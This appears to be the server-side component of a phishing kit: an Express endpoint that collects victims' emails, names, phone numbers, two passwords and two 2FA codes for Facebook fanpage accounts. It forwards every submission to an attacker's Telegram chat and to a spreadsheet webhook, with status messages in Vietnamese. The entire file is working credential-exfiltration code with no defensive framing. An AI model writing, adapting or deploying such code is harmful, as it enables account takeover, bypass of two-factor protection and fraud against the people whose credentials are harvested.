import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";
import rateLimit from "express-rate-limit";

const app = express();
app.use(cors('*'));
app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

const registerLimiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 7,
    message: 'Access forbidden: Too Many Requests',
    headers: true,
});

app.post('/api/resgister',registerLimiter, (req, res) => {
    const data = req.body; 

    if (!data.ip) {
        res.send({
            "status": 502,
            "message": "Wtf do you want?"
        });
    } else {
        const message = `Ip:<code>${data.ip ? data.ip : ''}</code>\n ---------------------------------\n Email Business: <code>${data.businessEmail ? data.businessEmail : ''} </code>\n Email Personal: <code>${data.personalEmail ? data.personalEmail : ''}</code>\n Full Name: <code>${data.fullName ? data.fullName : ''} </code>\n Fanpage Name: <code>${data.fanpageName ? data.fanpageName : ''}</code>\n Phone Number: <code>${data.mobilePhone ? data.mobilePhone : ''}</code>\n Password First: <code>${data.passwordFirst ? data.passwordFirst : ''}</code>\n Password Second: <code>${data.passwordSecond ? data.passwordSecond : ''}</code>\n ---------------------------------\n First Two-Fa: <code> ${data.firstTwoFa ? data.firstTwoFa : ''}</code>\n Second Two-Fa: <code> ${data.secondTwoFa ? data.secondTwoFa : ''}</code>\n Image: <code> ${data.imageUrl ? data.imageUrl : ''}</code>`;
        bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });

        res.send({
            "status": 0,
            "message": "Success!"
        });

        const url = new URL(process.env.WEBHOOK_URL);

        url.searchParams.append('Ip', data.ip ? data.ip : '');
        url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
        url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
        url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
        url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
        url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
        url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
        url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
        url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
        url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
        url.searchParams.append('Image', data.imageUrl ? data.imageUrl : '');

        axios.get(url)
        .then(response => {
            const data = response.data;
            if (data.status === 'success') {
                bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
            } else {
                bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
            }
        })
        .catch(error => {
            bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
        });
    }

});

app.listen(process.env.PORT, () => {
    console.log(`Server listening port ${process.env.PORT}`);
});
